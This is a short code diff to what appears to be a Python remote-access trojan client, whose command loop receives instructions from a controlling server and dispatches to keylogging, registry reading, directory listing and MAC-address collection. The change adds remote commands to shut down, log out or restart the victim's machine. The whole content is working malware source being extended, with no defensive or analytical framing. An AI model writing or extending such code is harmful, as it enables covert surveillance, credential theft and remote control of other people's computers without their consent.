@@ -22,9 +22,9 @@ def keylogger():
     kl.keylog(client)
     return
 
-def shutdown_logout():
+def shutdown_logout(msg):
     global client
-    sl.shutdown_logout(client)
+    sl.shutdown_logout(msg)
     return
 
 def mac_address():
@@ -85,6 +85,8 @@ def Connect():
             directory_tree()
         elif "REGISTRY" in msg:
             registry()
+        elif "SHUTDOWN" in msg or "LOGOUT" in msg or "RESTART" in msg:
+            shutdown_logout(msg)
         elif "QUIT" in msg:
             client.close()
             # s.close()
